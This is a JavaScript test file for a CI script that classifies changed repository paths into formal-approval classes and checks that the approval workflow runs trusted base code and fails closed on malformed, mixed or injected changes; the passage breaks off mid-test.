#!/usr/bin/env node

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath, pathToFileURL } from 'node:url';

import {
  classifyFormalApprovalScope,
  parseExactGitNameStatusZ,
} from './classify_formal_approval_scope.mjs';
import {
  MAINTENANCE_EXACT_ALLOWLIST,
} from './lib/mobile_ux_batch1_governance_recovery_contract.mjs';
import {
  validateFormalApprovalWorkflowStructure,
  validatePullRequestGateWorkflowStructure,
} from './validate_mobile_ux_batch1_governance.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const BATCH1_DECISION_PREFIX = 'docs/design/decisions/mobile-ux-batch1-';
const BATCH1 = Object.freeze({
  governanceFoundation:
    `${BATCH1_DECISION_PREFIX}governance-foundation-v1.md`,
  legacyMigrationIntent:
    `${BATCH1_DECISION_PREFIX}legacy-preparation-receipt-migration-v1.json`,
  legacyMigrationReceipt:
    `${BATCH1_DECISION_PREFIX}legacy-preparation-receipt-migration-v1.approval-receipt.json`,
  preparationReceipt:
    `${BATCH1_DECISION_PREFIX}preparation-v1.approval-receipt.json`,
  cohortDesignationIntent:
    `${BATCH1_DECISION_PREFIX}cohort-designation-v1.json`,
  cohortDesignationReceipt:
    `${BATCH1_DECISION_PREFIX}cohort-designation-v1.approval-receipt.json`,
  cohortNonPiiAttestation:
    `${BATCH1_DECISION_PREFIX}cohort-designation-v1.non-pii-attestation.json`,
  manifestFreezeIntent:
    `${BATCH1_DECISION_PREFIX}manifest-freeze-v1.json`,
  manifestFreezeReceipt:
    `${BATCH1_DECISION_PREFIX}manifest-freeze-v1.approval-receipt.json`,
});
const BATCH1_SUBJECT_PATHS = [
  'registry-set.v2.proposal.json',
  'cp-ba.registry.v2.proposal.json',
  'cp-cs.registry.v2.proposal.json',
  'cp-web.registry.v2.proposal.json',
  'manifest-schema-catalog.v1.json',
].map(
  filename =>
    `docs/design/ux-architecture/2026-08-09-mobile-ux-architecture-v5/batch-1/${filename}`,
);

function assertClassification(
  result,
  decisionClass,
  { sensitive = decisionClass !== 'ordinary', error = null } = {},
) {
  assert.equal(result.schema_version, 'formal-approval-scope.v2');
  assert.equal(result.sensitive, sensitive);
  assert.equal(result.decision_class, decisionClass);
  assert.equal(result.trusted_validation_required, sensitive);
  assert.equal(result.classification_error, error);
}

test('ordinary implementation changes do not require formal approval', () => {
  const result = classifyFormalApprovalScope([
    'apps/mobile/src/learning/LearningSurface.tsx',
    'infra/cloudbase/functions/softbook-api/index.js',
  ]);

  assertClassification(result, 'ordinary');
  assert.deepEqual(result.matched_paths, []);
});

test('classifier can be imported without a process argv entry', () => {
  const result = spawnSync(
    process.execPath,
    [
      '--input-type=module',
      '-e',
      `process.argv.splice(1); await import(${JSON.stringify(pathToFileURL(path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs')).href)});`,
    ],
    {cwd: ROOT, encoding: 'utf8'},
  );
  assert.equal(result.status, 0, result.stderr);
});

test('launch records, evidence, validators, and workflows fail closed when a maintenance payload lacks its recovery pair', () => {
  const changed = [
    'AGENTS.md',
    'docs/release/launch-readiness.v1.json',
    'docs/agent-runs/evidence/run.json',
    'security/reports/penetration-test.json',
    'scripts/lib/launch_evidence_contract.mjs',
    'scripts/lib/strict_json.mjs',
    'scripts/validate_dependency_security.mjs',
    'scripts/test_validate_dependency_security.mjs',
    'scripts/validate_launch_readiness.mjs',
    'scripts/report_repo_health.mjs',
    'scripts/harness_validator/sections/product_contract_mirrors.py',
    'scripts/harness_validator/sections/truth_mirrors.py',
    'scripts/harness_validator/sections/governance_contracts.py',
    'security/dependency-audit-policy.json',
    'scripts/harness_validator/sections/harness_architecture.py',
    'spec/account-sync-contract.json',
    'spec/authority-map.json',
    'spec/doc-manifest.json',
    'spec/release-operational-policy.json',
    'spec/runtime-boundaries.json',
    '.github/workflows/fake-formal-approval.yml',
  ];
  const result = classifyFormalApprovalScope(changed);

  assertClassification(result, 'generic_sensitive', {
    error: 'governance_maintenance_payload_without_recovery_pair',
  });
  assert.deepEqual(result.matched_paths, [...changed].sort());
});

test('governance foundation changes are distinguished from generic sensitivity', () => {
  const result = classifyFormalApprovalScope([
    'AGENTS.md',
    BATCH1.governanceFoundation,
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-foundation-v1.md',
    'spec/agent-harness.json',
    'spec/authority-map.json',
    'spec/doc-manifest.json',
    'spec/mobile-ux-batch1-governance.json',
    'spec/mobile-ux-batch1-resolved-requirement.schema.json',
  ]);

  assertClassification(result, 'governance_foundation');
});

test('an installed trusted-code payload cannot change without a recovery pair', () => {
  const result = classifyFormalApprovalScope(['scripts/lib/strict_json.mjs']);

  assertClassification(result, 'generic_sensitive', {
    error: 'governance_maintenance_payload_without_recovery_pair',
  });
});

test('every maintenance payload requires a recovery pair instead of falling through generic-sensitive validation', () => {
  const decision =
    'docs/design/decisions/mobile-ux-batch1-governance-maintenance-v1/pr-731-exact-maintenance.json';
  const runRecord =
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-maintenance-pr-731-exact-maintenance.md';
  const payloads = [
    ...MAINTENANCE_EXACT_ALLOWLIST,
    'scripts/fixtures/mobile-ux-batch1-foundation-activation-v1/new-data.fixture',
  ];
  for (const payload of payloads) {
    assertClassification(classifyFormalApprovalScope([payload]), 'generic_sensitive', {
      error: 'governance_maintenance_payload_without_recovery_pair',
    });
    assertClassification(
      classifyFormalApprovalScope([decision, runRecord, payload]),
      'governance_maintenance',
    );
  }
});

test('each exact Batch 1 subject path requires trusted subject validation', async t => {
  for (const subjectPath of BATCH1_SUBJECT_PATHS) {
    await t.test(subjectPath, () => {
      const result = classifyFormalApprovalScope([subjectPath]);

      assertClassification(result, 'batch1_subject_change');
      assert.deepEqual(result.matched_paths, [subjectPath]);
    });
  }
});

test('other Batch 1 architecture paths remain generically sensitive', () => {
  const path =
    'docs/design/ux-architecture/2026-08-09-mobile-ux-architecture-v5/batch-1/README.md';
  const result = classifyFormalApprovalScope([path]);

  assertClassification(result, 'generic_sensitive');
  assert.deepEqual(result.matched_paths, [path]);
});

test('execution manifests fail closed until a dedicated authorization class exists', () => {
  const manifestPath =
    'docs/design/ux-architecture/2026-08-09-mobile-ux-architecture-v5/batch-1/execution-manifests/run.json';
  const standalone = classifyFormalApprovalScope([manifestPath]);
  assertClassification(standalone, 'generic_sensitive', {
    error: 'execution_manifest_authorization_not_implemented',
  });

  const mixedWithReceipt = classifyFormalApprovalScope([
    BATCH1.cohortDesignationReceipt,
    manifestPath,
  ]);
  assertClassification(mixedWithReceipt, 'generic_sensitive', {
    error: 'execution_manifest_authorization_not_implemented',
  });
});

test('each authority-bearing intent receives its exact decision class', async t => {
  const cases = [
    [BATCH1.legacyMigrationIntent, 'legacy_receipt_migration_intent'],
    [BATCH1.cohortDesignationIntent, 'cohort_designation_intent'],
    [BATCH1.manifestFreezeIntent, 'manifest_freeze_intent'],
  ];

  for (const [intentPath, decisionClass] of cases) {
    await t.test(decisionClass, () => {
      const result = classifyFormalApprovalScope([
        intentPath,
        `docs/agent-runs/2026-08-10-mobile-ux-batch1-${decisionClass.replaceAll('_', '-')}.md`,
      ]);

      assertClassification(result, decisionClass);
      assert.ok(result.matched_paths.includes(intentPath));
    });
  }
});

test('cohort intent may carry only its fixed non-PII attestation support path', () => {
  const result = classifyFormalApprovalScope([
    BATCH1.cohortDesignationIntent,
    BATCH1.cohortNonPiiAttestation,
    'apps/mobile/README.md',
  ]);

  assertClassification(result, 'cohort_designation_intent');
  assert.deepEqual(result.matched_paths, [
    BATCH1.cohortDesignationIntent,
    BATCH1.cohortNonPiiAttestation,
  ].sort());
});

test('a non-PII attestation without its cohort intent fails closed', () => {
  const result = classifyFormalApprovalScope([
    BATCH1.cohortNonPiiAttestation,
  ]);

  assertClassification(result, 'generic_sensitive', {
    error: 'privacy_attestation_without_cohort_designation_intent',
  });
});

test('each fixed approval receipt is classified as receipt materialization', async t => {
  const receiptPaths = [
    BATCH1.legacyMigrationReceipt,
    BATCH1.preparationReceipt,
    BATCH1.cohortDesignationReceipt,
    BATCH1.manifestFreezeReceipt,
  ];

  for (const receiptPath of receiptPaths) {
    await t.test(receiptPath, () => {
      const result = classifyFormalApprovalScope([receiptPath]);

      assertClassification(result, 'receipt_materialization');
    });
  }
});

test('every unknown mobile-ux-batch1 decision path is sensitive and invalid', () => {
  const unknownPath = `${BATCH1_DECISION_PREFIX}unregistered-authority.json`;
  const result = classifyFormalApprovalScope([unknownPath]);

  assertClassification(result, 'generic_sensitive', {
    error: 'unknown_batch1_decision_path',
  });
  assert.deepEqual(result.matched_paths, [unknownPath]);
});

test('canonical recovery decision and run-record pairs select each exact protected class', () => {
  const cases = [
    {
      kind: 'maintenance',
      decisionClass: 'governance_maintenance',
      payload: ['scripts/lib/mobile_ux_batch1_github_event_reader.mjs'],
    },
    {
      kind: 'revocation',
      decisionClass: 'governance_revocation',
      payload: ['AGENTS.md', 'spec/agent-harness.json', 'spec/authority-map.json', 'spec/doc-manifest.json'],
    },
    {
      kind: 'rebootstrap',
      decisionClass: 'governance_rebootstrap',
      payload: ['AGENTS.md', 'spec/agent-harness.json', 'spec/authority-map.json', 'spec/doc-manifest.json'],
    },
  ];
  for (const {kind, decisionClass, payload} of cases) {
    const decision =
      `docs/design/decisions/mobile-ux-batch1-governance-${kind}-v1/pr-731-exact-${kind}.json`;
    const runRecord =
      `docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-${kind}-pr-731-exact-${kind}.md`;
    const result = classifyFormalApprovalScope([decision, runRecord, ...payload]);
    assertClassification(result, decisionClass);
    assert.ok(result.matched_paths.includes(decision));
    assert.ok(result.matched_paths.includes(runRecord));
  }
});

test('recovery path identity, cardinality, scope, and class mixing fail closed', () => {
  const maintenanceDecision =
    'docs/design/decisions/mobile-ux-batch1-governance-maintenance-v1/pr-731-repair-reader.json';
  const maintenanceRun =
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-maintenance-pr-731-repair-reader.md';
  const revocationRun =
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-revocation-pr-731-repair-reader.md';

  assertClassification(
    classifyFormalApprovalScope([maintenanceDecision]),
    'generic_sensitive',
    {error: 'governance_recovery_decision_without_run_record'},
  );
  assertClassification(
    classifyFormalApprovalScope([maintenanceRun]),
    'generic_sensitive',
    {error: 'governance_recovery_run_record_without_decision'},
  );
  assertClassification(
    classifyFormalApprovalScope([maintenanceDecision, revocationRun]),
    'generic_sensitive',
    {error: 'governance_recovery_decision_run_record_mismatch'},
  );

  const outside = classifyFormalApprovalScope([
    maintenanceDecision,
    maintenanceRun,
    'apps/mobile/src/App.tsx',
  ]);
  assert.equal(outside.decision_class, 'generic_sensitive');
  assert.match(outside.classification_error, /governance_maintenance_payload_outside_allowlist/);

  for (const workflowPath of [
    '.github/workflows/formal-approval.yml',
    '.github/workflows/pr-gates.yml',
  ]) {
    const workflowMaintenance = classifyFormalApprovalScope([
      maintenanceDecision,
      maintenanceRun,
      workflowPath,
    ]);
    assert.equal(workflowMaintenance.decision_class, 'generic_sensitive');
    assert.match(
      workflowMaintenance.classification_error,
      /governance_maintenance_payload_outside_allowlist/,
    );
  }

  const mixed = classifyFormalApprovalScope([
    maintenanceDecision,
    maintenanceRun,
    BATCH1_SUBJECT_PATHS[0],
  ]);
  assert.equal(mixed.decision_class, 'generic_sensitive');
  assert.match(mixed.classification_error, /governance_recovery_and_batch1_authority_or_subject_mixed/);

  const missingAnchor = classifyFormalApprovalScope([
    'docs/design/decisions/mobile-ux-batch1-governance-revocation-v1/pr-731-stop.json',
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-revocation-pr-731-stop.md',
    'AGENTS.md',
  ]);
  assertClassification(missingAnchor, 'generic_sensitive', {
    error: 'governance_recovery_anchor_scope_mismatch',
  });
});

test('all canonical Batch 1 run records remain permanently sensitive and unbound changes fail closed', () => {
  const paths = [
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-bootstrap.md',
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-governance-foundation-v1.md',
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-r0-subject.md',
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-d1-intent.md',
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-b2-subject.md',
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-f3-receipt.md',
  ];
  for (const relativePath of paths) {
    const result = classifyFormalApprovalScope([relativePath]);
    assert.equal(result.sensitive, true, relativePath);
    assert.equal(result.decision_class, 'generic_sensitive', relativePath);
    assert.ok(result.matched_paths.includes(relativePath), relativePath);
    assert.notEqual(result.classification_error, null, relativePath);
  }

  const renamed = classifyFormalApprovalScope([
    'docs/agent-runs/2026-08-10-mobile-ux-batch1-r0-subject.md',
    'docs/agent-runs/2026-08-11-mobile-ux-batch1-r0-subject-renamed.md',
  ]);
  assert.match(renamed.classification_error, /multiple_canonical_batch1_run_records/);
  assert.match(renamed.classification_error, /unbound_canonical_batch1_run_record/);
});

test('mixed authority-bearing intent classes fail closed', async t => {
  const cases = [
    [BATCH1.legacyMigrationIntent, BATCH1.cohortDesignationIntent],
    [BATCH1.legacyMigrationIntent, BATCH1.manifestFreezeIntent],
    [BATCH1.cohortDesignationIntent, BATCH1.manifestFreezeIntent],
  ];

  for (const paths of cases) {
    await t.test(paths.join(' + '), () => {
      const result = classifyFormalApprovalScope(paths);

      assertClassification(result, 'generic_sensitive', {
        error: 'mixed_authority_bearing_classes',
      });
    });
  }
});

test('multiple receipts and any intent plus receipt fail closed', () => {
  const multipleReceipts = classifyFormalApprovalScope([
    BATCH1.preparationReceipt,
    BATCH1.cohortDesignationReceipt,
  ]);
  assertClassification(multipleReceipts, 'generic_sensitive', {
    error: 'multiple_receipt_materializations',
  });

  const intentAndReceipt = classifyFormalApprovalScope([
    BATCH1.cohortDesignationIntent,
    BATCH1.cohortDesignationReceipt,
  ]);
  assertClassification(intentAndReceipt, 'generic_sensitive', {
    error: 'decision_intent_and_receipt_mixed',
  });
});

test('subject or governance foundation changes cannot ride an authority head', () => {
  const subjectAndIntent = classifyFormalApprovalScope([
    BATCH1_SUBJECT_PATHS[0],
    BATCH1.cohortDesignationIntent,
  ]);
  assertClassification(subjectAndIntent, 'generic_sensitive', {
    error: 'batch1_subject_and_authority_change_mixed',
  });

  const governanceAndIntent = classifyFormalApprovalScope([
    'scripts/classify_formal_approval_scope.mjs',
    BATCH1.manifestFreezeIntent,
  ]);
  assertClassification(governanceAndIntent, 'generic_sensitive', {
    error:
      'governance_maintenance_payload_without_recovery_pair,governance_foundation_and_authority_change_mixed',
  });

  const governanceAndSubject = classifyFormalApprovalScope([
    'scripts/test_classify_formal_approval_scope.mjs',
    BATCH1_SUBJECT_PATHS[1],
  ]);
  assertClassification(governanceAndSubject, 'generic_sensitive', {
    error:
      'governance_maintenance_payload_without_recovery_pair,governance_foundation_and_batch1_subject_mixed',
  });
});

test('renamed sensitive paths remain sensitive through previous filenames', () => {
  const result = classifyFormalApprovalScope([
    'docs/archive/retired-readiness.json',
    'docs/release/launch-readiness.v1.json',
  ]);

  assertClassification(result, 'generic_sensitive');
  assert.deepEqual(result.matched_paths, [
    'docs/release/launch-readiness.v1.json',
  ]);
});

test('empty and malformed changed-file input fails closed', () => {
  assertClassification(classifyFormalApprovalScope([]), 'generic_sensitive', {
    error: 'empty_changed_paths',
  });
  const malformed = classifyFormalApprovalScope(['../outside', '/absolute']);
  assertClassification(malformed, 'generic_sensitive', {
    error: 'invalid_paths,empty_changed_paths',
  });
  assert.deepEqual(malformed.invalid_paths, ['../outside', '/absolute']);
});

test('duplicates and blank lines are normalized deterministically', () => {
  const result = classifyFormalApprovalScope([
    '',
    'apps/mobile/package.json',
    'apps/mobile/package.json',
  ]);

  assert.deepEqual(result.changed_paths, ['apps/mobile/package.json']);
  assertClassification(result, 'ordinary');
});

test('CLI writes the trusted GitHub Actions output', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.txt');
  const output = path.join(tmp, 'github-output.txt');
  fs.writeFileSync(files, 'docs/release/launch-readiness.v1.json\n');

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--files',
      files,
      '--github-output',
      output,
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 0, result.stderr);
  assert.equal(
    fs.readFileSync(output, 'utf8'),
    [
      'sensitive=true',
      'decision_class=generic_sensitive',
      'trusted_validation_required=true',
      'classification_error=',
      '',
    ].join('\n'),
  );
});

test('CLI exposes a fail-closed classification error as a single output value', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.txt');
  const output = path.join(tmp, 'github-output.txt');
  fs.writeFileSync(files, `${BATCH1_DECISION_PREFIX}unknown.json\n`);

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--files',
      files,
      '--github-output',
      output,
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 0, result.stderr);
  assert.equal(
    fs.readFileSync(output, 'utf8'),
    [
      'sensitive=true',
      'decision_class=generic_sensitive',
      'trusted_validation_required=true',
      'classification_error=unknown_batch1_decision_path',
      '',
    ].join('\n'),
  );
});

test('GitHub file input fails closed when API pagination is truncated', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.json');
  fs.writeFileSync(
    files,
    JSON.stringify([[{ filename: 'apps/mobile/package.json' }]]),
  );

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--github-files',
      files,
      '--expected-count',
      '2',
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 1);
  assert.match(result.stderr, /changed-file list is incomplete/);
});

test('GitHub file input rejects the API safety limit', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.json');
  fs.writeFileSync(files, JSON.stringify([[]]));

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--github-files',
      files,
      '--expected-count',
      '3000',
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 1);
  assert.match(result.stderr, /3000-file API safety limit/);
});

test('GitHub file input fails closed on duplicate current filenames', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.json');
  fs.writeFileSync(
    files,
    JSON.stringify([
      [{ filename: 'apps/mobile/package.json' }],
      [{ filename: 'apps/mobile/package.json' }],
    ]),
  );

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--github-files',
      files,
      '--expected-count',
      '2',
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 1);
  assert.match(result.stderr, /duplicate filename/);
});

test('GitHub file input includes previous rename paths', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.json');
  fs.writeFileSync(
    files,
    JSON.stringify([
      [
        {
          filename: 'docs/archive/retired-readiness.json',
          previous_filename: 'docs/release/launch-readiness.v1.json',
        },
      ],
    ]),
  );

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--github-files',
      files,
      '--expected-count',
      '1',
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 0, result.stderr);
  assert.equal(JSON.parse(result.stdout).sensitive, true);
});

test('a renamed Batch 1 intent is still classified from its previous path', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-scope-'));
  t.after(() => fs.rmSync(tmp, { force: true, recursive: true }));
  const files = path.join(tmp, 'files.json');
  fs.writeFileSync(
    files,
    JSON.stringify([
      [
        {
          filename: 'docs/archive/retired-cohort-intent.json',
          previous_filename: BATCH1.cohortDesignationIntent,
        },
      ],
    ]),
  );

  const result = spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--github-files',
      files,
      '--expected-count',
      '1',
    ],
    { cwd: ROOT, encoding: 'utf8' },
  );

  assert.equal(result.status, 0, result.stderr);
  assertClassification(
    JSON.parse(result.stdout),
    'cohort_designation_intent',
  );
});

test('exact Git classification is bound to the event head and includes both sides of rename and copy records', t => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'softbook-formal-git-scope-'));
  t.after(() => fs.rmSync(tmp, {force: true, recursive: true}));
  const git = (args) => {
    const result = spawnSync('git', args, {cwd: tmp, encoding: 'utf8'});
    assert.equal(result.status, 0, result.stderr);
    return result.stdout.trim();
  };
  git(['init', '-q']);
  git(['config', 'user.name', 'Scope Test']);
  git(['config', 'user.email', 'scope@example.invalid']);
  const sensitive = 'docs/release/launch-readiness.v1.json';
  const renamed = 'docs/archive/retired-readiness.json';
  fs.mkdirSync(path.join(tmp, 'docs', 'release'), {recursive: true});
  fs.writeFileSync(path.join(tmp, sensitive), '{"status":"base"}\n');
  git(['add', sensitive]);
  git(['commit', '-qm', 'base']);
  const baseSha = git(['rev-parse', 'HEAD']);

  fs.mkdirSync(path.join(tmp, 'docs', 'archive'), {recursive: true});
  git(['mv', sensitive, renamed]);
  git(['commit', '-qm', 'event rename']);
  const eventHeadSha = git(['rev-parse', 'HEAD']);

  fs.writeFileSync(path.join(tmp, 'ordinary.txt'), 'live head advanced\n');
  git(['add', 'ordinary.txt']);
  git(['commit', '-qm', 'later live head']);
  assert.notEqual(git(['rev-parse', 'HEAD']), eventHeadSha);

  const classify = (headSha) => spawnSync(
    process.execPath,
    [
      path.join(ROOT, 'scripts', 'classify_formal_approval_scope.mjs'),
      '--root', tmp,
      '--base-sha', baseSha,
      '--head-sha', headSha,
    ],
    {cwd: tmp, encoding: 'utf8'},
  );
  const renameResult = classify(eventHeadSha);
  assert.equal(renameResult.status, 0, renameResult.stderr);
  const renameProjection = JSON.parse(renameResult.stdout);
  assertClassification(renameProjection, 'generic_sensitive');
  assert.deepEqual(renameProjection.changed_paths, [renamed, sensitive]);

  git(['checkout', '-qb', 'copy-event', baseSha]);
  fs.mkdirSync(path.join(tmp, 'docs', 'archive'), {recursive: true});
  fs.copyFileSync(path.join(tmp, sensitive), path.join(tmp, renamed));
  git(['add', renamed]);
  git(['commit', '-qm', 'event copy']);
  const copyHeadSha = git(['rev-parse', 'HEAD']);
  const copyResult = classify(copyHeadSha);
  assert.equal(copyResult.status, 0, copyResult.stderr);
  const copyProjection = JSON.parse(copyResult.stdout);
  assertClassification(copyProjection, 'generic_sensitive');
  assert.deepEqual(copyProjection.changed_paths, [renamed, sensitive]);
});

test('the shared exact Git record parser accepts Git similarity scores and rejects malformed records', () => {
  assert.deepEqual(
    parseExactGitNameStatusZ(
      Buffer.from(
        'R051\0old.json\0new.json\0C098\0source.md\0copy.md\0R100\0a\0b\0',
        'utf8',
      ),
      'valid score fixture',
    ),
    [
      {status: 'R051', oldPath: 'old.json', path: 'new.json'},
      {status: 'C098', oldPath: 'source.md', path: 'copy.md'},
      {status: 'R100', oldPath: 'a', path: 'b'},
    ],
  );
  assert.throws(
    () => parseExactGitNameStatusZ(
      Buffer.from([0x4d, 0x00, 0xff, 0x00]),
      'invalid UTF-8 fixture',
    ),
    /not valid UTF-8/,
  );
  assert.throws(
    () => parseExactGitNameStatusZ(
      Buffer.from('R101\0old.json\0new.json\0', 'utf8'),
      'invalid score fixture',
    ),
    /unsupported status R101/,
  );
});

test('approval workflow classifies with trusted base code before protected approval', () => {
  const workflow = fs.readFileSync(
    path.join(ROOT, '.github', 'workflows', 'formal-approval.yml'),
    'utf8',
  );
  const checkoutUse =
    'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7';
  const setupNodeUse =
    'uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7';
  const jobsSection = workflow.split('\njobs:\n', 2)[1];
  const jobNames = [...jobsSection.matchAll(/^  ([a-z_]+):$/gm)].map((match) => match[1]);
  const namedSteps = (job, nextJob) => {
    const section = workflow
      .split(`\n  ${job}:`, 2)[1]
      .split(`\n  ${nextJob}:`, 1)[0];
    return [...section.matchAll(/^      - name: (.+)$/gm)].map((match) => match[1]);
  };
  const permissions = workflow
    .slice(workflow.indexOf('permissions:'), workflow.indexOf('\nconcurrency:'))
    .trim();

  assert.equal(validateFormalApprovalWorkflowStructure(workflow), true);

  assert.match(workflow, /^  pull_request_target:/m);
  assert.doesNotMatch(workflow, /^  pull_request:/m);
  assert.deepEqual(jobNames, [
    'classify',
    'trusted_validation',
    'automatic',
    'product_owner',
    'result',
  ]);
  assert.equal(
    permissions,
    [
      'permissions:',
      '  actions: read',
      '  contents: read',
      '  deployments: read',
      '  pull-requests: read',
    ].join('\n'),
  );
  assert.equal((workflow.match(new RegExp(checkoutUse, 'g')) ?? []).length, 3);
  assert.equal((workflow.match(new RegExp(setupNodeUse, 'g')) ?? []).length, 3);
  assert.deepEqual(
    workflow.split('\n').filter((line) => /^\s+uses:/.test(line)).map((line) => line.trim()),
    [checkoutUse, setupNodeUse, checkoutUse, setupNodeUse, checkoutUse, setupNodeUse],
  );
  assert.equal(
    (workflow.match(/ref: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/g) ?? []).length,
    3,
  );
  assert.equal((workflow.match(/persist-credentials: false/g) ?? []).length, 3);
  assert.equal((workflow.match(/fetch-depth: 0/g) ?? []).length, 3);
  assert.equal((workflow.match(/node-version: "22\.13\.0"/g) ?? []).length, 3);
  assert.equal(
    (workflow.match(/git fetch --no-tags origin "refs\/pull\/\$PR_NUMBER\/head"/g) ?? []).length,
    3,
  );
  assert.doesNotMatch(workflow, /^\s+(?:git )?(?:checkout|switch|worktree)\b.*HEAD_SHA/m);
  assert.doesNotMatch(workflow, /^\s+ref:.*pull_request\.head\.sha/m);
  assert.equal(
    (workflow.match(/git status --porcelain=v1 --untracked-files=all/g) ?? []).length,
    6,
  );
  assert.deepEqual(namedSteps('classify', 'trusted_validation'), [
    'Checkout trusted base revision',
    'Verify trusted base checkout',
    'Set up trusted Node.js runtime',
    'Fetch exact event head as Git data',
    'Classify formal approval scope',
    'Fail closed on classification errors',
  ]);
  assert.deepEqual(namedSteps('trusted_validation', 'automatic'), [
    'Checkout trusted base revision',
    'Verify trusted base checkout',
    'Set up trusted Node.js runtime',
    'Read pull request data from GitHub',
    'Fetch untrusted head as data only',
    'Validate the pull request with trusted base code',
  ]);
  assert.deepEqual(namedSteps('product_owner', 'result'), [
    'Checkout trusted base revision',
    'Verify trusted base checkout',
    'Set up trusted Node.js runtime',
    'Fetch untrusted head as data only',
    'Verify the current protected approval from trusted base code',
  ]);
  assert.match(workflow, /formal-approval-trusted-validation/);
  assert.match(workflow, /node scripts\/validate_mobile_ux_batch1_governance\.mjs validate-pr/);
  assert.match(
    workflow,
    /node scripts\/validate_mobile_ux_batch1_governance\.mjs verify-current-run-approval/,
  );
  assert.match(workflow, /--workflow-run-id "\$GITHUB_RUN_ID"/);
  assert.match(workflow, /--workflow-run-attempt "\$GITHUB_RUN_ATTEMPT"/);
  assert.equal((workflow.match(/--decision-class "\$DECISION_CLASS"/g) ?? []).length, 2);
  assert.match(workflow, /--root \. \\\n\s+--base-sha "\$BASE_SHA" \\\n\s+--head-sha "\$HEAD_SHA"/);
  assert.ok(
    workflow.indexOf('  trusted_validation:') < workflow.indexOf('  product_owner:'),
    'trusted validation must precede protected owner approval',
  );
  assert.match(workflow, /\.changed_files/);
  assert.match(workflow, /--paginate --slurp/);
  assert.match(workflow, /--expected-count/);
  assert.match(workflow, /name: formal-product-owner-approval/);
  assert.match(workflow, /^    name: formal-approval$/m);
});

test('approval workflow structure rejects unnamed injected steps and extra step or job keys', async (t) => {
  const workflow = fs.readFileSync(
    path.join(ROOT, '.github', 'workflows', 'formal-approval.yml'),
    'utf8',
  );
  const jobs = [
    ['classify', 'trusted_validation'],
    ['trusted_validation', 'automatic'],
    ['automatic', 'product_owner'],
    ['product_owner', 'result'],
    ['result', null],
  ];
  for (const [jobName, nextJob] of jobs) {
    await t.test(`${jobName} unnamed run`, () => {
      const boundary = nextJob === null
        ? workflow.length
        : workflow.indexOf(`\n  ${nextJob}:`);
      assert.notEqual(boundary, -1);
      const injected =
        `${workflow.slice(0, boundary)}\n      - run: echo "untrusted injected step"${workflow.slice(boundary)}`;
      assert.throws(
        () => validateFormalApprovalWorkflowStructure(injected),
        new RegExp(`formal approval workflow ${jobName} step count drift`),
      );
    });
  }

  const extraStepKey = workflow.replace(
    '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        with:',
    '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        shell: bash\n        with:',
  );
  assert.throws(
    () => validateFormalApprovalWorkflowStructure(extraStepKey),
